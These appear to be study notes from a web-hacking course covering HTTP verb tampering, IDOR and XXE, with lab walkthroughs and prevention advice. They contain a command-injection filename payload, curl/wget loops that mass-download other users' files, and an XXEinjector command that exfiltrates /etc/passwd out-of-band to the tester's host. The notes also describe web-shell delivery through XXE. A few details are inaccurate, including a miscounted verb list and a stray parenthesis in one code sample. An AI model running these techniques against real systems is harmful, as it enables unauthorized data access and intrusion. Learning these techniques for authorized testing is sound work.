# Web Attacks

## Introduction to Web Attacks

web attacks are the most common types of attacks against companies   

attacking external-facing web apps can lead to compromise of internal network which can lead to stolen assets or disrupted services   
even if the org doesn't use external facing web apps they will still likely use internal ones or external facing API endpoints, both of which are still vulnerable to the same types of attacks 

### HTTP verb tampering 

these attacks exploit web servers that accept many HTTP verbs and methods   
can be exploited by sending malicious requests using unexpected methods which may lead to bypassing authentication or security controls against other web attacks   

these are one of many other HTTP attacks that can be used to exploit web server configs by sending malicious HTTP requests 

### Insecure direct object references (IDOR)

among the most common web vulnerabilities and can lead to accessing data that should not be accessible by attackers   
so common because of a lack of solid access control system on backends   

web apps store users files and info, which may use sequential numbers or user IDs to identify them   
suppose the app exposes direct access to these files, in this case we can then access other user's files and info by simply guessing or calculating their file IDs 

### XML external entity (XXE) injection 

many web apps parse XML data; suppose they use outdated XML libraries to parse and process user XML input data, then it would be possible to send malicious files to disclose local files   
these files may contain sensitive info or source code   

can also be leveraged to steal the hosting server's credentials which could compromise the entire server and allow for RCE 

## Intro to HTTP Verb Tampering 

HTTP protocol works by accepting different HTTP methods as `verbs` at the beginning of the request   
web apps may be scripted to accept certain HTTP methods for their various functionalities and perform a particular action based on the type of request 

developers usually consider only GET and POST but any client can send any other methods in their requests   
if GET and POST are the only ones that accepted then it is more secure other than revealing sensitive error info   
there is also the case where the app accepts other methods but isn't develop to handle them like HEAD and PUT, we might be able to exploit this insecure config to gain access to functionalities that we don't have access to or bypass security controls 

### HTTP verb tampering 

HTTP has 9 different verbs that can be accepted by web servers: 
- GET 
- POST 
- HEAD - like GET but only contains the headers without the response body 
- PUT - writes the request payload to the specified location 
- DELETE - deletes the resource at specified location 
- OPTIONS - shows different options accepted by the server like accepted HTTP verbs
- PATCH - apply partial mods to the resource at the specified location 

 what makes verb tampering more common and more critical is that they are caused by misconfigs in either the backend web server or the web app 

### Insecure configurations 

insecure web server configs cause the first type of vulnerabilities   
a server's authentication config may be limited to specific methods, which would leave some HTTP methods accessible without authentication 

a sysadmin may use this config to require authentication on a page: 

```xml
<Limit GET POST>
    Require valid-user
</Limit>
```

even though it specifies GET and POST an attacker may still use other methods that wont be limited by the authentication   
this would lead to authentication bypass and allows attackers to access web pages and domains they don't have access to 

### Insecure coding 

can occur when a developer applies specific filters to mitigate vulnerabilities while not covering all HTTP methods   

lets say that the developer mitigated SQLi by using the following filter: 

```php
$pattern = "/^[A-Za-z\s]+$/";

if(preg_match($pattern, $_GET["code"])) {
    $query = "Select * from ports where port_code like '%" . $_REQUEST["code"] . "%'";
    ...SNIP...
}
```

we can see that the filter is only being tested on the GET parameter but the `$_REQUEST["code"]` parameters are being used which is open to all parameters   
if you supplied something like POST, then the GET parameters would be empty and would result in the pass by the filter 

insecure coding is more common because insecure configs are usually less prone to errors with modern server configs/documentation warnings 

## Bypassing Basic Authentication 

exploiting HTTP verb tampering is straightforward because we just need to try different methods   
many automated vulnerability scanning tools can find HTTP verb tampering caused by insecure server configs but they will usually miss insecure coding ones   
this is because insecure configs can easily be identified once we bypass an authentication page while the other needs active testing to see whether we can bypass the security filters 

insecure web config vulnerabilities can allow us to bypass the HTTP basic authentication prompt on certain pages

### Identify 

our target seems to be a file manager app: 

![](Images/Pasted%20image%2020240223140049.png)

when we try to reset all the available files we are prompted with basic HTTP auth: 

![](Images/Pasted%20image%2020240223140031.png)

we don't have credentials so we can check to see if it is open to a verb tampering attack   
first we need to see which pages are restricted by this authentication   

the page we are on is `/admin/reset.php` so either the whole `/admin` directory is restricted or only the reset page

when we try to visit the admin directory we can see that the full directory is behind authentication: 

![](Images/Pasted%20image%2020240223140351.png)

### Exploit 

we can capture the request to the reset page and see that it is a basic GET request: 

![](Images/Pasted%20image%2020240223140607.png)

so now with the repeater we can change the request method to try POST requests: 

![](Images/Pasted%20image%2020240223140707.png)

however, when we forward this request we also get blocked: 

![](Images/Pasted%20image%2020240223140801.png)

we can still try many other methods like HEAD which even though we might not get any output from, the actual functionality of the reset page will hopefully get executed 

we can first see what methods might be available by sending an OPTIONS request: 

![](Images/Pasted%20image%2020240223141519.png)

![](Images/Pasted%20image%2020240223141654.png)

in our case the OPTIONS request will initiate the reset functionality but we could have also seen what methods were available to us: 

![](Images/Pasted%20image%2020240223141936.png)

## Bypassing Security Filters 

the other more common way of exploiting HTTP verb tampering is through insecure coding   
for example, a filter that only checked for injections in POST parameters 

### Identify 

if we use the file upload functionality and try to upload a file with special characters it will get blocked: 

![](Images/Pasted%20image%2020240223142537.png)

any modification of the file name payload will never be accepted, however we can now try a verb tampering attack  to bypass the filter in place altogether  

### Exploit

we can try change the request method by capturing the request: 

![](Images/Pasted%20image%2020240223143005.png)

if we don't get the error message and our file is created, we can test if we bypassed the security filter by attempting to exploit the vulnerability that the filter is protecting - which in this case is command injection   

we can try something like `file; touch file2;` in our request and see that both files get created: 

![](Images/Pasted%20image%2020240223143146.png)

we can also try other commands to view files on the target web server: 

![](Images/Pasted%20image%2020240223143355.png)

## Verb Tampering Prevention 

insecure configs and coding are usually what introduce HTTP verb tampering  

### Insecure configuration 

verb tampering can occur in most modern web servers like apache, tomcat, and ASP.NET   
usually happens when we limit a page's authorization to a certain set of HTTP verbs/methods, leaving the other methods unprotected 

here is an example of a vulnerable config for an apache web server which is in the `000-default.conf` or in the `.htaccess` web page config file: 

```xml
<Directory "/var/www/html/admin">
    AuthType Basic
    AuthName "Admin Panel"
    AuthUserFile /etc/apache2/.htpasswd
    <Limit GET>
        Require valid-user
    </Limit>
</Directory>
```

the GET request is the only method that requires a valid user which means that all other methods won't be subject to that filter 

the same vulnerability can be found in a tomcat config in the `web.xml` file: 

```xml
<security-constraint>
    <web-resource-collection>
        <url-pattern>/admin/*</url-pattern>
        <http-method>GET</http-method>
    </web-resource-collection>
    <auth-constraint>
        <role-name>admin</role-name>
    </auth-constraint>
</security-constraint>
```

and again the same can be found in ASP.NET in the `web.config` file: 

```xml
<system.web>
    <authorization>
        <allow verbs="GET" roles="admin">
            <deny verbs="GET" users="*">
        </deny>
        </allow>
    </authorization>
</system.web>
```

we should always avoid restricting auth to particular methods and always allow/deny all HTTP verbs and methods 

if we want to specify a single method then we can use safe keywords like `LimitExcept` in apache, `http-method-omission` in tomcat, and `add/remove` in ASP.NET 

we should also consider disabling/denying all HEAD requests unless it is required by the app 

### Insecure coding 

patching insecure coding can be much more difficult because we need to find inconsistencies in the use of HTTP parameters across functions   

```php
if (isset($_REQUEST['filename'])) {
    if (!preg_match('/[^A-Za-z0-9. _-]/', $_POST['filename'])) {
        system("touch " . $_REQUEST['filename']);
    } else {
        echo "Malicious Request Denied!";
    }
}
```

the error in the above code is that the filter only checks for the POST method while at the same time using `$_REQUEST` which is open to both GET and POST   

in a production app these won't be so obvious because they will be spread across the app and will not be on two consecutive lines like in the example   
the app instead might have a function for checking for injections and a different function for creating files   

we must be consistent with our use of HTTP methods and ensure that the same method is used for any specific functionality across the web app   
always advised to test all types of request parameters   

we can test for all parameters with: 

![](Images/Pasted%20image%2020240223144940.png)

## Intro to IDOR

insecure direct object references (IDOR) are among the most common web vulnerabilities   
occur when a site exposes a direct reference to an object like a file or a database resource  

a solid access control system is hard to make, so IDORs are very pervasive   
also, automating the process of identifying weaknesses in access control systems is also quite hard  
if a web app creates a file to download like `download.php?file_id=123` and there is no proper access control system in place then the same user could change the file id in the request to access another file that doesn't belong to them 

### What makes an IDOR vulnerability 

the exposure of a resource is not a vulnerability in itself but it could make it possible to exploit another vulnerability: a weak access control system   
what would happen if a user had access to pages, functions, and APIs that they weren't supposed to  

many ways to implement a solid access control system for web apps like Role-BAC   

many developers ignore building an access control system, leaving the backend unprotected   

### Impact of IDOR vulnerabilities 

most basic example of IDOR is accessing private files and resources = IDOR information disclosure vulnerabilities   
this may even lead to the modification or deletion of these resources, which then can lead to complete account takeover 

can also lead to the elevation of user privileges from a standard user to an admin user with IDOR insecure function calls   
many web apps will expose URL parameters or APIs for admin-only functions in the front-end code   
if the backend doesn't deny non-admin users from calling these functions then we might be able to perform unauthorized admin operations like changing user credentials or granting users certain roles which could lead to a total takeover of the entire web application 

## Identifying IDORs 

the first step to exploiting IDORs is identifying direct object references   
when we receive files or resources we need to look at the HTTP request to look for URL parameters or APIs with an object reference like `?uid=1` or `?filename=file_1.pdf`   
these are mostly found in url parameters or APIs but could also be found in headers like cookies 

in the most basic cases we can try incrementing the values for these references, but we can also use fuzzers to find possible hits 

### AJAX calls

we might also be able to find unused parameters or APIs in the front-end code from JS AJAX calls  
some web apps might place all functions on the front-end and use the appropriate ones based on the user role   

for example, if we don't have an admin account then we won't be able to use the admin functions but they still might be able to be found in the front-end js code, and we might be able to find AJAX calls to specific end-points or APIs that contain direct object references 

```javascript
function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){
            //
        }
    });
}
```

the above function might not be called since we aren't an admin but if we are able to find it then we might test different ways to call it, which would indicate that it is vulnerable to IDOR 

### Understand hashing/encoding 

some apps will encode or hash the values for the object references 

even if something is hashed and we think it might not be possible to reproduce, we might be able to find the hashing function in the source code: 

```javascript
$.ajax({
    url:"download.php",
    type: "post",
    dataType: "json",
    data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
    success:function(result){
        //
    }
});
```

### Compare user roles

if we want to do more advanced IDOR attacks we can register multiple users and compare their HTTP requests and object references   
from this we can understand how the url parameters and unique identifiers are being calculated 

if we had two users, one of which can view their salary after making the following API call: 

```json
{
  "attributes" : 
    {
      "type" : "salary",
      "url" : "/services/data/salaries/users/1"
    },
  "Id" : "1",
  "Name" : "User1"

}
```

the second user might not have all these API parameters to replicate the call, but we can try to repeat this call with the second user to see if the app returns anything   
these might work if the web app only requires a valid login session to make the API call and no backend verification of the caller's session and the requested data 

in this case we can either identify the API parameters for other users or we still identify the backend access control vulnerability 

## Mass IDOR Enumeration 

some IDORs can be simple but for advanced IDORs we need to understand how the app works, how it calculates its object references, and how its access control system works 

### Insecure parameters 

if our target is an app that hosts employee records: 

![](Images/Pasted%20image%2020240225172422.png)

we can see that in a target like this we might have visible user ids or resources: 

![](Images/Pasted%20image%2020240225172602.png)

![](Images/Pasted%20image%2020240225172608.png)

we might guess that the file names are using the userid and the month/year as part of the file name, which might let us fuzz for other files   
this is a basic type of IDOR and is called `static file IDOR` 

we can find that the page is setting our user id from a GET parameter like `documents.php?uid=1`   
we can try to change this value and see if we don't get an access denied error  

if we make the change and don't notice any difference, we need to pay attention to the page details and keep and eye on the source code and page size   
for example we can look and see that changing to `uid=2` will result in different files 

another example of this is instead of using the user id itself the app will user filters specific to the user like `uid_filter=1`   

### Mass enumeration 

we can first look at any of the links in the page to see their source code: 

```html
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```

we want to pick out a phrase like `<li class='pure-tree_link'>` to be able to grep for in our output from: 

```shell-session
curl -s "http://SERVER_IP:PORT/documents.php?uid=1" | grep "<li class='pure-tree_link'>"
```

then we can further filter to only get the resource names: 

```shell-session
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
```

then for this example we can use a simple loop to go over the uid parameter and try to return all the employee documents: 

```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
	for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
		wget -q $url/$link
	done
done
```

running this script will download all the employee documents from 1-10 and exploit the IDOR to mass enumerate the documents of all employees   

we can do the same in burp by creating a list of employee numbers: 

![](Images/Pasted%20image%2020240225174908.png)

capturing the get document request: 

![](Images/Pasted%20image%2020240225174924.png)

then with the payload we can see an id that returns the flag: 

![](Images/Pasted%20image%2020240225175031.png)

## Bypassing Encoded References 

in our target if we click on the employee contract file to download a file we can capture the request: 

![](Images/Pasted%20image%2020240226104513.png)

when the request is sent we can get an encoded value like: 

```php
contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
```

using a some sort of download.php script to download files is common to avoid directly linking to files   

in this example the app appears to be hashing the file with md5  
we can try to calculate the hashes of values for things like uid, username, filename, etc.   

we can use tools like `Burp comparer` to fuzz various values for the hash   
in this example we can't seem to crack the hash leading us to think that it may contain a combination of values or a unique value that would make it a secure direct object reference 

### Function disclosure 

many developers may make the mistake of performing sensitive functions on the front-end   
if the above hash was calculated on the front-end then we can study the function to replicate it  

we can see in this app that it is calling the download contract function: 

![](Images/Pasted%20image%2020240226105223.png)

another example is: 

```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```

in this case the user id will be base64 encoded then md5 hashed using the cryptojs library 

we can test our own values to see if we can replicate the code: 

```shell
echo -n 1 | base64 -w 0 | md5sum
```

make sure to use `-n` and `-w 0` to avoid adding newlines 

### Mass enumeration 

we can create a script to encode and hash many values to try to enumerate other files: 

```shell
for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
```

```bash
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```

we can also so this in burp with payload processing to base64, hash, or urlencode our payloads: 

![](Images/Pasted%20image%2020240226112335.png)

## IDOR in Insecure APIs

IDORs may also exist in function calls and APIs, and exploiting them might let us perform various actions as other users   
`IDOR insecure function calls` enable us to call APIs or execute functions as another user

these functions may be used to change info, reset passwords, or even buy items using another account   
in many cases we may obtain info through info disclosure IDOR then using that info with IDOR insecure function call vulnerabilities 

### Identifying insecure APIs

in our target we have an update profile function: 

![](Images/Pasted%20image%2020240226113824.png)

![](Images/Pasted%20image%2020240226113803.png)

we can see that we are using a PUT request to update the item details and that their are a few hidden parameters that aren't seen in the UI   
uid, uuid, and role are parameters that are automatically set by the app  
it also appears that the app is setting our user access privileges on the front-end with the `role=employee` cookie 

we could potentially change this role to give ourselves different permissions, but at the moment we don't know what types of roles exist 

### Exploiting insecure APIs 

in this example there are a few things we can try: 
- change our uid to another user's 
- change another user's details 
- create new users with arbitrary details or delete existing users 
- change our role to a more privileged one 

we can see that changing the uid to another users will result in a mismatch error: 

![](Images/Pasted%20image%2020240226114342.png)

now lets also try to change the API endpoint to match the new user's id: 

![](Images/Pasted%20image%2020240226114445.png)

now we instead get a uuid mismatch since the app appears to have controls that compare the requested profile with the uuid   

lets see if we can create a new user by changing the request to a POST request and setting arbitrary user id values: 

![](Images/Pasted%20image%2020240226114639.png)

we can see that we don't have permission to create new employees so now lets try to change our role to admin or administrator: 

![](Images/Pasted%20image%2020240226114753.png)

without knowing the correct role name we will get the invalid role error 

with all of these test we might thing that the application is secure against IDORs  
however, in these tests we have only been checking for insecure function calls, but we haven't checked the APIs GET request to look for IDOR information disclosures   
we can try to get these to read other user's details which might help us with the attacks we have just tried 

## Chaining IDOR Vulnerabilities 

in the previous section we saw that the only form of authorization is the `role=employee` cookie and doesn't contain any other form of user-specific authorization like a JWT token   
even if the token did exist it would need to be compared to the requested object by the backend access control system, otherwise we would still have access to other user's details 

### Information disclosure 

we can change our request to a GET request to see other user's info: 

![](Images/Pasted%20image%2020240226115448.png)

this is an information disclosure vulnerability which gives us access to to details like the uuid which we couldn't calculate before 

with this employee's uuid we can do the intended application's functionality to change another user's info: 

![](Images/Pasted%20image%2020240226115718.png)

then we can confirm that it worked with another GET request: 

![](Images/Pasted%20image%2020240226115804.png)

with this ability we can perform attacks like changing the user's email address and requesting a password reset link   
we could also place an XSS payload in the about field which would get executed when the actual user visits the edit profile page  

### Chaining two IDOR vulnerabilities 

now that we can find other user's info we can enumerate the different types of roles: 

![](Images/Pasted%20image%2020240226120326.png)

now that we know that the admin role is "staff_admin" we can change our own user account to have this role: 

![](Images/Pasted%20image%2020240226120603.png)

![](Images/Pasted%20image%2020240226120618.png)

using the staff_admin cookie we can then try to create a new user: 

![](Images/Pasted%20image%2020240226120752.png)

![](Images/Pasted%20image%2020240226120807.png)

as we can see we can use the info we get from info disclosure vulnerabilities to complete insecure function calls   
on many occasions the info we leak through IDOR vulnerabilities can be utilized in other attacks like IDOR or XSS 

## IDOR Prevention 

IDOR vulnerabilities are mainly caused by improper access control on the backend servers   
to prevent this we need to build an object-level access control system and then use secure references for our objects when storing and calling them 

### Object-level access control 

the design of an access control system needs to support the segmentation of roles and permissions in a centralized manner   

we must map the RBAC to all objects and resources to avoid the exploitation of IDOR   
the backend will then be able to allow or deny every request based on the requester's role compared to the resource being requested 

here is an example of how a web app may compare user roles to objects to allow or deny access:

```javascript
match /api/profile/{userId} {
    allow read, write: if user.isAuth == true
    && (user.uid == userId || user.roles == 'admin');
}
```

### Object referencing 

having access to direct references to objects (direct object referencing) makes it possible to enumerate and exploit access control vulnerabilities   

even with a solid access control system we should never use object references in clear text or simple patters like `uid=1`  
instead we should use salted hashes or UUIDs with something like UUID V4  

once we generate a strong id for an element we can map it to the object it is referencing in the backend database, so that whenever the UUID is called the backend will know which object to return 

```php
$uid = intval($_REQUEST['uid']);
$query = "SELECT url FROM documents where uid=" . $uid;
$result = mysqli_query($conn, $query);
$row = mysqli_fetch_array($result));
echo "<a href='" . $row['url'] . "' target='_blank'></a>";
```

we should also never calculate these hashes on the frontend and instead generate them when an object is created and store them in the backend database   
then we can create database maps to enable quick cross-referencing of objects and references 

one thing to note is that using UUIDs may let IDORs go undetected because it makes it harder to test for IDORs   
this is why strong object referencing is always the second step after strong access control  

## Intro to XXE 

XML external entity (XXE) injection occur when XML data is taken from a user-controlled input without properly sanitizing or parsing it   
can cause damage like disclosing sensitive files or shutting down the backend server 

### XML 

extensible markup language is a common language like HTML or SGML for flexible transfer of storage of data and documents in various types of apps   
focused on storing document's data and representing data structures   
uses element trees where each element is denoted by a tag; first element is the root and others are called child

```xml
<?xml version="1.0" encoding="UTF-8"?>
<email>
  <date>01-01-2022</date>
  <time>10:00 am UTC</time>
  <sender>john@inlanefreight.com</sender>
  <recipients>
    <to>HR@inlanefreight.com</to>
    <cc>
        <to>billing@inlanefreight.com</to>
        <to>payslips@inlanefreight.com</to>
    </cc>
  </recipients>
  <body>
  Hello,
      Kindly share with me the invoice for the payment made on January 1, 2022.
  Regards,
  John
  </body> 
</email>
```

the above example shows some of the key elements like: 
- tag - keys of an xml document wrapped in `<>` - `<date>`
- entity - xml variables usually wrapped in `&` or `;` - `&lt;`
- element - root element or any of its children, value is stored in between start and end tag - `<date>01-01-2022</date>`
- attribute - optional specifications for any element that are stored in the tags which may be used by the xml parser - `version="1.0"/encoding="UTF-8"`
- declaration - usually the first line of the xml document, defines the version and encoding - `<?xml version="1.0" encoding="UTF-8"?>`

some characters are used in the document so will need to be converted to their entity references like `&gt;` if we want to use them somewhere else   

### XML DTD

XML document type definition (DTD) allows the validation of an XML document against a pre-defined document structure   
pre-defined document structure can be defined in the document itself or in an external file 

```xml
<!DOCTYPE email [
  <!ELEMENT email (date, time, sender, recipients, body)>
  <!ELEMENT recipients (to, cc?)>
  <!ELEMENT cc (to*)>
  <!ELEMENT date (#PCDATA)>
  <!ELEMENT time (#PCDATA)>
  <!ELEMENT sender (#PCDATA)>
  <!ELEMENT to  (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
]>
```

the above example will declare the root email element with the `ELEMENT` type declaration and denoting its child elements   
then each child is declared where some have other children and others have raw data 

this can be placed in the XML document itself right after the XML declaration in the first line, or it can be stored in an external file like `email.dtd` and referenced within the XML document with the `SYSTEM` keyword: 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "email.dtd">
```

can also reference a DTD through a URL: 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd">
```

### XML entities 

can also define custom entities (XML variables) in XML DTDs to allow refactoring of variables and reduce repetitive data   
can be done with the use of the `ENTITY` keyword: 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

once we define an entity then we can reference it inbetween an `&` and `;` like with `&company;`   
we can also reference external XML entities with the SYSTEM keyword: 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "http://localhost/company.txt">
  <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
]>
```

note that we can also use the `PUBLIC` keyword instead of `SYSTEM` for loading external resources, which is used with publicly declared entities and standards like the language code `lang="en"` 

when the xml is parsed on the server side then an entity can reference a file stored on the backend which might be disclosed to use when we reference the entity 

## Local File Disclosure

when a web app allows unfiltered user input XML data, we might be able to reference an external XML DTD document and define new custom XML entities   
if we can get these new entities to be displayed on the web page then we should be able to define entities and make them reference a local file which would show us the content of a file from the backend server 

### Identifying 

we first need to find a web page that accepts XML user input: 

![](Images/Pasted%20image%2020240227130811.png)

![](Images/Pasted%20image%2020240227130759.png)

if we send the form request without any modifications we get an email message: 

![](Images/Pasted%20image%2020240227130909.png)

in this response, we can see that the value of the email element is being displayed back to us, this will come in handy if we want to display the contents of a local file   

lets try to define a new entity and use it as a variable in the email element to see if it gets replaced with the value we define: 

```xml
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

note that in this example there was no DTD being declared so we added one, but if there was already a `DOCTYPE` defined then we would just add the `ENTITY` element to it 

so now we have defined a new entity and can reference it in the email element: 

![](Images/Pasted%20image%2020240227131354.png)

we can see that it gets reflected in the response: 

![](Images/Pasted%20image%2020240227131415.png)

this confirms that this request is vulnerable to XXE injections because it replaces our injected entity with a value instead of just returning the raw value of `&company;`   

some web apps default to JSON format in HTTP request but may still accept other formats like XML   
to change the format we can try changing the `Content-Type` header to `application/xml` and convert the JSON data to XML with an online tool like convertjson.com 

### Reading sensitive files

we can also use the `SYSTEM` keyword to define the external reference path: 

![](Images/Pasted%20image%2020240227173655.png)

![](Images/Pasted%20image%2020240227140834.png)

we successfully read the local file meaning we can also use the vulnerability to look at other files like config files that contain passwords or sensitive files like `id_rsa` ssh key of a user   

note that in some java apps we might be able to specify a directory instead of a file 

### Reading source code 

lets now try to read the source code of the index.php file: 

![](Images/Pasted%20image%2020240227141616.png)

we get an error because the file we are referencing is not in a proper XML format so it fails to be referenced as an external XML entity   
if a file contains some of XML's special characters `<`, `>`, `&` then it would break the external entity reference and not be used; we also could not read any binary data 

PHP provides wrapper filters that allow us to base64 encode certain resources like files  
we can use `php://filter/` as a wrapper and specify the `convert.base64-encode` as our filter and then add an input resource `resource=index.php`: 

![](Images/Pasted%20image%2020240227173641.png)

after sending this we can get the base64 encoded string of the index.php file: 

![](Images/Pasted%20image%2020240227142659.png)

### Remote code execution with XXE 

in addition to viewing local files we might also be able to gain RCE, with the easiest method being to look for ssh keys or attempt to utilize a hash stealing trick in windows-based web apps  
if these don't work then we could still execute commands on PHP based web apps through the `PHP://expect` filter, but this requite the `expect` module to be installed and enabled

if the XXE prints the output as we just saw then we could execute basic commands as `expect://id`   
if we didn't have access to the output or needed to execute a more complicate command like a reverse shell then the XML syntax may break and not execute 

the most efficient method to turn XXE into RCE is by fetching a web shell from our server and writing it to the web app 

we can start by writing a basic PHP web shell and starting a python web server: 

![](Images/Pasted%20image%2020240227173605.png)

then inject the following XML to execute a curl command to download our web shell: 

![](Images/Pasted%20image%2020240227173621.png)

after sending the request we should receive a request on our machine for the shell.php file   
however, keep in mind that the `expect` module is not enabled/installed by default on modern php servers 

### Other XXE attacks 

another common attack carried out by XXE vulnerabilities is SSRF exploitation which is used to enumerate locally open ports and access their pages 

another common use of XXE attacks is causing a DoS: 

![](Images/Pasted%20image%2020240227145424.png)

the payload defines `a0` as `DOS`, references it in `a1` multiple times, references `a1` in `a2` and so on until the backend runs out of memory   
however this no longer works with modern web servers like apache since they protect against entity self-references   

## Advanced File Disclosure 

some file formats may not be readable through basic XXE and the web app might not output any input values so we might have to force it through errors 

### Advanced exfiltration with CDATA 

previously we used PHP filters to read files that otherwise would be blocked by using special characters, but for other types of applications we can use another method like wrapping the content of external file references with a `CDATA` tag (`<![CDATA[ FILE_CONTENT ]]>`)  
this way the XML parser considers this part raw data which can contain any characters 

one easy way to do this is to define a `begin` internal entity with `<![CDATA[`, and `end` internal entity with `]]>`, and then place our external entity file in between  
then this should be considered as a `CDATA` element: 

![](Images/Pasted%20image%2020240227173732.png)

then we can reference the `&joined;` entity that should contain our escaped data   
but this will not work because XML prevents joining internal and external entities 

to bypass this will will use XML parameter entities which are special entities that start with `%` and can only be used in a DTD  
parameter entities when referenced from an external source (like our own server) would all be considered as external and can be joined:

![](Images/Pasted%20image%2020240227175925.png)

lets first store the above line in a DTD file xxe.dtd, host it on our machine, and reference it as an external entity: 

![](Images/Pasted%20image%2020240227180428.png)

![](Images/Pasted%20image%2020240227180611.png)

we will then be able to see the print out of the submitDetails.php file: 

![](Images/Pasted%20image%2020240227180849.png)

we might not be able to read some files like index.php because the web server would be preventing a DOS attack caused by file/entity self-references 

### Error based XXE 

often the app will not provide any output so we can't control any of the XML input entities to write its content   

if the app displays runtime errors like PHP errors, and doesn't have proper exception handling for the XML input we can use this to read the output of the XXE exploit: 

![](Images/Pasted%20image%2020240227183758.png)

from the error we can see that it revealed the web server directory which we can use to read other files 

to exploit the errors we can host a DTD file that contains: 

![](Images/Pasted%20image%2020240227184004.png)

this will create the `file` parameter and joins it with an entity that doesn't exist   
this will output that the nonExistingEntity doesn't exist along with the joined `%file;` as part of the error 

we can then call our external entity and with `&error;`: 

![](Images/Pasted%20image%2020240227184208.png)

![](Images/Pasted%20image%2020240227184312.png)

we can do the same thing to view the source code of files by changing the file name in our DTD script to point to a file we want to read like `"file:///var/www/html/submitDetails.php"`  
however this isn't as reliable because the app may have length limitations and certain special characters might break it 

## Blind Data Exfiltration 

previously we relied on error outputs to view the output of our payloads, but now we will focus on completely blind XXE vulnerabilities 

### Out-of-band data exfiltration 

these attacks are similar to other out-of-band attacks where they involve hosting our own server with our payloads 

now one thing we will do differently is instead of having the web app output our file entity to a specific XML entity, we will make the web app send a request to our server with the content of the file we are reading 

we can first use a parameter entity for the content of the file we are using while using PHP filters and base64 encoding   
then we will use another external parameter entity to reference it to our IP, and place the file parameter value as part of the URL being requested: 

![](Images/Pasted%20image%2020240227191541.png)

when the XML tries to reference the external `oob` entity from our machine it will request it with the base64 encoded contents of the requested resource in the `content` parameter 

we can even use a script to automatically detect the output and decode it: 

![](Images/Pasted%20image%2020240227191733.png)

first we write the script to index.php and start our php server: 

![](Images/Pasted%20image%2020240227191801.png)

then we call our payload file in our request with the content entity: 

![](Images/Pasted%20image%2020240227192344.png)

and we can see the output in our server: 

![](Images/Pasted%20image%2020240227192520.png)

in addition to storing our base64 encoded data as a URL parameter, we can also use `DNS OOB Exfiltration` by placing the encoded data as a sub-domain for our URL (ENCODEDTEXT.our.site.com) then use a tool like tcpdump to capture incoming traffic and decode the sub-domain string to get the data 

### Automated OOB exfiltration 

we can also automate the method we just tried with tools like `XXEinjector`   
can clone with: 

```shell
git clone https://github.com/enjoiz/XXEinjector.git
```

then we need to copy the HTTP request and write it to a file with `XXEINJECT` after it as a postion locator: 

![](Images/Pasted%20image%2020240227192810.png)

then we can run the tool with the `--host` or `--httpport` flags for our IP and port, `--file` for the file with the request, and the `--path` for the file we want to read   
we can also use `--oob=http` and `--phpfilter` to repeat the OOB attack we did above with: 

```shell
ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```

all exfiltrated files get store din the `Logs` folder under the tool which we can view to see the output 

## XXE Prevention 

most XXE vulnerabilities occur when an unsafe XML input references an external entity, which is then used to read sensitive files and perform other actions 

preventing XXE vulnerabilities is typically easier because they are caused by outdated XML libraries 

### Avoiding outdated components 

secure coding practices are usually what solve other web vulnerabilities, but not always the case for XXE because XML is usually not handled manually by the developers but by built-in XML libraries instead   

for example, PHP's [libxml_disable_entity_loader](https://www.php.net/manual/en/function.libxml-disable-entity-loader.php) function is deprecated since it allows a developer to enable external entities in an unsafe manner   

[OWASP's XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#php)

we should also update any components that parse XML input such as API libraries like SOAP   
any document or file processors that may perform XML parsing like SVG image processors or PDF document processors can also be vulnerable 

### Using save XML configurations 

certain xml configs can reduce the possibility of XXE: 
- disable referencing custom document type definitions (DTD)
- disable referencing external XML entities 
- disable parameter entity processing 
- disable support for XInclude
- prevent entity reference loops 

another thing to look out for is having proper exception handling and preventing runtime errors from being output 

many people will simply recommend not using XML and instead just use JSON or YAML, which also includes avoiding API standards like SOAP that rely on XML   

finally, using WAFs will also protect against XXE vulnerabilities 

## Web Attacks - Skills Assessment 

testing a social networking app   
try to use techniques learned in this module to exploit multiple vulnerabilities found in the web app 

our app opens after logging in: 

![](Images/Pasted%20image%2020240227205855.png)

a couple things worth noting is the settings page to change passwords, which could be vulnerable to verb tampering or IDOR: 

![](Images/Pasted%20image%2020240227205946.png)

then looking at the source code we can immediately find a function that tells us how the app fetches the user page: 

![](Images/Pasted%20image%2020240227210007.png)

I will start with this since it seems that it simply uses the API to search based on the `uid` cookie

we can see this fetch call being made in burp: 

![](Images/Pasted%20image%2020240227211144.png)

I start by fuzzing this request to enumerate some accounts while also looking for terms like "admin" or "test": 

![](Images/Pasted%20image%2020240227211742.png)

we can successfully get to the profile page of the admin: 

![](Images/Pasted%20image%2020240227212439.png)

but we can see that we can change the password of our default HTB user account but not the admin account: 

![](Images/Pasted%20image%2020240227212206.png)

